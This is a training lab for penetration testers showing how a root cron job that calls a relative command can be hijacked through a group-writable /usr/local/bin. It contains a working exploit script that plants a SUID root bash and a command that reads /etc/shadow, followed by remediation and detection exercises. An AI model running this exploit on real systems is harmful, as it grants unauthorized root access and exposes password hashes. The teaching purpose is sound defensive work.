# LAB: Cron PATH Injection → Root

**Real-World Privilege Escalation**

---

## Scenario: Custom Administration Scripts

You are a penetration tester who has gained initial access to a Linux server as a low-privilege user (`developer`). Your goal is to escalate to root.

**Background:**
The sysadmin has created custom administration scripts that run via cron. The cron job uses a relative command name (without full path), and the PATH includes a directory writable by the developer.

**Your access:**
- SSH access as `developer`
- Member of the `staff` group
- Write access to `/usr/local/bin` (staff group writable)
- No sudo privileges

**Your mission:**
Escalate from `developer` to `root` using only the access you have.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Understand how cron handles the PATH environment
2. Identify dangerous PATH configurations
3. Exploit PATH hijacking to execute malicious code
4. Achieve root access through command shadowing
5. Recognize the importance of absolute paths in privileged scripts

---

## PHASE 0 — Environment Setup (Instructor Only)

### Create the staff group and developer user

```bash
groupadd staff
useradd -m -s /bin/bash -G staff developer
echo "developer:developer123" | chpasswd
```

### Make /usr/local/bin writable by staff group

This simulates a common pattern where sysadmins allow staff to install local utilities:

```bash
chown root:staff /usr/local/bin
chmod 775 /usr/local/bin
```

### Create the admin script (uses relative command)

```bash
cat > /opt/admin/backup-system.sh << 'EOF'
#!/bin/bash
# System Backup Script
# Deployed by IT Operations
# Ticket: ITOPS-3921

LOG="/var/log/backup.log"
echo "[$(date)] Starting system backup" >> "$LOG"

# Run backup utilities
backup-util --full /var/data
compress --best /var/backups/latest.tar

echo "[$(date)] Backup complete" >> "$LOG"
EOF

mkdir -p /opt/admin
chmod 755 /opt/admin/backup-system.sh
chown root:root /opt/admin/backup-system.sh
```

### Create the legitimate backup-util command

```bash
cat > /usr/bin/backup-util << 'EOF'
#!/bin/bash
# Legitimate backup utility
echo "Running backup: $@"
EOF
chmod 755 /usr/bin/backup-util
```

### Create the cron job (uses PATH that includes writable directory)

```bash
cat > /etc/cron.d/backup-system << 'EOF'
# System backup - runs every 5 minutes for lab demonstration
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin

*/5 * * * * root /opt/admin/backup-system.sh
EOF
chmod 644 /etc/cron.d/backup-system
```

### Create required directories and log file

```bash
mkdir -p /var/data /var/backups
touch /var/log/backup.log
chmod 644 /var/log/backup.log
```

**Setup complete.** The environment mimics a server with delegated local bin management.

---

## PHASE 1 — Initial Access & Reconnaissance

### Log in as the attacker

```bash
su - developer
```

### Verify your privileges

```bash
id
```

**Expected:**
```
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(staff)
```

```bash
sudo -l
```

**Expected:** No sudo access.

---

## PHASE 2 — Enumeration

### Check group memberships

```bash
groups
```

**Found:** `staff` group membership

### Check for writable directories in PATH locations

```bash
ls -la /usr/local/bin
```

**Observations:**
```
drwxrwxr-x 2 root staff 4096 ... /usr/local/bin
```

- Directory is group-writable
- `staff` group has write access
- We're in the `staff` group!

### Check for cron jobs

```bash
cat /etc/cron.d/*
```

**Found:**
```
PATH=/usr/local/bin:/usr/bin:/bin
*/5 * * * * root /opt/admin/backup-system.sh
```

**Critical observation:** PATH starts with `/usr/local/bin` (writable!)

### Examine the backup script

```bash
cat /opt/admin/backup-system.sh
```

**Key findings:**
```bash
backup-util --full /var/data
compress --best /var/backups/latest.tar
```

- Uses relative command names (no full path)
- `backup-util` is called without `/usr/bin/backup-util`

### Verify the legitimate command location

```bash
which backup-util
```

**Shows:** `/usr/bin/backup-util`

---

## 🔴 STOP AND THINK

**Ask yourself:**

1. Can I modify the cron job? → No
2. Can I modify the backup script? → No
3. Can I write to a directory in cron's PATH? → **Yes** (`/usr/local/bin`)
4. Does the script use relative commands? → **Yes** (`backup-util`)
5. Does `/usr/local/bin` come before `/usr/bin` in PATH? → **Yes**

**This is a PATH injection/hijacking vulnerability.**

---

## PHASE 3 — Understanding the Attack

### How PATH resolution works

When a command without a full path is executed, the shell searches directories in PATH order:

```
PATH=/usr/local/bin:/usr/bin:/bin

Script runs: backup-util --full /var/data

Shell searches:
1. /usr/local/bin/backup-util  ← CHECKED FIRST (we can write here!)
2. /usr/bin/backup-util        ← Legitimate command
3. /bin/backup-util
```

If we create `/usr/local/bin/backup-util`, it will be executed instead of the legitimate `/usr/bin/backup-util`.

### The attack chain

```
developer creates /usr/local/bin/backup-util
    → Root cron runs backup script
    → Script calls "backup-util" (relative)
    → Shell finds /usr/local/bin/backup-util first
    → Malicious script executes as root
```

---

## PHASE 4 — Exploitation

### Create a malicious backup-util in /usr/local/bin

```bash
cat > /usr/local/bin/backup-util << 'EOF'
#!/bin/bash
# Malicious backup-util - executes before the real one

# Create SUID root shell
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash

# Leave evidence
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt

# Optionally call the real backup-util to avoid suspicion
# /usr/bin/backup-util "$@"
EOF

chmod +x /usr/local/bin/backup-util
```

### Verify the malicious command is in place

```bash
ls -la /usr/local/bin/backup-util
```

### Check which command would be executed

```bash
which backup-util
```

**Should now show:** `/usr/local/bin/backup-util` (our malicious version)

---

## PHASE 5 — Wait for Execution

### Option A: Wait for cron

```bash
watch -n 10 'ls -la /tmp/rootbash /tmp/pwned.txt 2>/dev/null'
```

### Option B: Instructor triggers manually

```bash
sudo /opt/admin/backup-system.sh
```

### Verify execution

```bash
ls -la /tmp/rootbash
cat /tmp/pwned.txt
```

---

## PHASE 6 — Privilege Escalation Complete

### Execute the SUID shell

```bash
/tmp/rootbash -p
```

### Verify root access

```bash
id
whoami
cat /etc/shadow | head -3
```

---

## PHASE 7 — Post-Exploitation Analysis

### The attack chain

```
developer (uid=1001, group=staff)
    │
    ├── Enumerated group memberships
    ├── Found /usr/local/bin is staff-writable
    ├── Found cron PATH includes /usr/local/bin first
    ├── Found backup script uses relative command
    │
    ▼
Created malicious /usr/local/bin/backup-util
    │
    ├── Placed before legitimate /usr/bin/backup-util in PATH
    │
    ▼
Root cron executed backup script
    │
    ├── Script called "backup-util" (relative)
    ├── Shell found /usr/local/bin/backup-util first
    ├── Malicious script executed as root
    ├── SUID bash created
    │
    ▼
root (euid=0)
```

### What failed

| Layer | Failure |
|-------|---------|
| **Permissions** | /usr/local/bin writable by staff group |
| **Script** | Used relative commands instead of absolute paths |
| **Cron** | PATH includes writable directory first |

### The one-sentence summary

> **Root's cron job used a relative command that resolved to a writable directory in PATH.**

---

## REMEDIATION

### Fix 1: Use absolute paths in scripts

```bash
# Bad
backup-util --full /var/data

# Good
/usr/bin/backup-util --full /var/data
```

### Fix 2: Set PATH explicitly in script

```bash
#!/bin/bash
# Set safe PATH at the start of script
export PATH=/usr/bin:/bin
```

### Fix 3: Remove writable directories from cron PATH

```bash
# Bad
PATH=/usr/local/bin:/usr/bin:/bin

# Good
PATH=/usr/bin:/bin
```

### Fix 4: Protect /usr/local/bin

```bash
# Remove group write permission
chmod 755 /usr/local/bin
chown root:root /usr/local/bin
```

### Fix 5: Use env -i to clear environment

```bash
# In cron, run with clean environment
*/5 * * * * root /usr/bin/env -i PATH=/usr/bin:/bin /opt/admin/backup-system.sh
```

---

## VULNERABILITY CLASSIFICATION

| Framework | Classification |
|-----------|----------------|
| **CWE** | CWE-426: Untrusted Search Path |
| **CWE** | CWE-427: Uncontrolled Search Path Element |
| **MITRE ATT&CK** | T1574.007: Path Interception by PATH Environment Variable |

---

## REAL-WORLD EXAMPLES

This vulnerability pattern appears in:

1. **Custom admin scripts** — Using relative commands
2. **Multi-user systems** — Shared bin directories with loose permissions
3. **Development servers** — /usr/local/bin writable by devs
4. **Container escapes** — PATH manipulation in container environments

---

## CLEANUP (Instructor)

```bash
pkill -u developer 2>/dev/null || true
userdel -r developer 2>/dev/null || true
groupdel staff 2>/dev/null || true
rm -f /etc/cron.d/backup-system
rm -rf /opt/admin
rm -f /usr/local/bin/backup-util
rm -f /usr/bin/backup-util
rm -f /var/log/backup.log
rm -rf /var/data /var/backups
rm -f /tmp/rootbash /tmp/pwned.txt
# Restore /usr/local/bin permissions
chmod 755 /usr/local/bin
chown root:root /usr/local/bin
```

---

## STUDENT EXERCISES

### Exercise 1: Alternative Commands

What other commands in the backup script could be hijacked?

### Exercise 2: LD_PRELOAD Attack

Research LD_PRELOAD. How could it be used for similar privilege escalation?

### Exercise 3: Detection

Write a script that detects:
- World/group-writable directories in PATH
- Scripts that use relative commands
- Cron jobs with dangerous PATH settings

### Exercise 4: Library Path Hijacking

Research LD_LIBRARY_PATH attacks. How do they compare to PATH hijacking?
